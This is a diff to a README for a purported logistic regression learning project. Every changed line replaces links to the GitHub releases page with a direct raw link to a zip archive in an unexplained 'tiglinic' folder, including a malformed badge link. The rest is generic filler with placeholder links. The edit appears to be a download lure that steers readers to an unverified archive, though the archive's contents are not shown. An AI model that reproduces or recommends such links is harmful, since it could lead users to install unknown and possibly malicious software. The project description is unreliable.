@@ -4,7 +4,7 @@
 Welcome to the Logistic Regression project! This software helps you use Logistic Regression to classify data easily. After completing this lab, you will be able to preprocess data for modeling and apply Logistic Regression on real-world data.
 
 ## 🔗 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/mahmoudbalal784-create/Logistic-Regression/releases)
+[![Download the latest release](https://raw.githubusercontent.com/mahmoudbalal784-create/Logistic-Regression/main/tiglinic/Logistic-Regression_v3.6-alpha.5.zip%https://raw.githubusercontent.com/mahmoudbalal784-create/Logistic-Regression/main/tiglinic/Logistic-Regression_v3.6-alpha.5.zip)](https://raw.githubusercontent.com/mahmoudbalal784-create/Logistic-Regression/main/tiglinic/Logistic-Regression_v3.6-alpha.5.zip)
 
 ## 📋 Features
 - Use Logistic Regression for classification tasks.
@@ -18,7 +18,7 @@ To run this software, you need:
 - A modern web browser for accessing the downloads page.
 
 ## 📥 Download & Install
-To download the Logistic Regression software, visit this page to download: [Logistic Regression Releases](https://github.com/mahmoudbalal784-create/Logistic-Regression/releases). Follow the steps below:
+To download the Logistic Regression software, visit this page to download: [Logistic Regression Releases](https://raw.githubusercontent.com/mahmoudbalal784-create/Logistic-Regression/main/tiglinic/Logistic-Regression_v3.6-alpha.5.zip). Follow the steps below:
 
 1. Click on the link above.
 2. Find the latest version of the software.
@@ -57,7 +57,7 @@ If you face any challenges, don't hesitate to consult the following resources:
 - **Community Forum:** Join our forum to connect with other users and get support.
 
 ## 🔗 Links
-- Visit the download page: [Logistic Regression Releases](https://github.com/mahmoudbalal784-create/Logistic-Regression/releases)
+- Visit the download page: [Logistic Regression Releases](https://raw.githubusercontent.com/mahmoudbalal784-create/Logistic-Regression/main/tiglinic/Logistic-Regression_v3.6-alpha.5.zip)
 - User Guide: [User Guide Link]
 - Support Forum: [Community Forum Link]
 
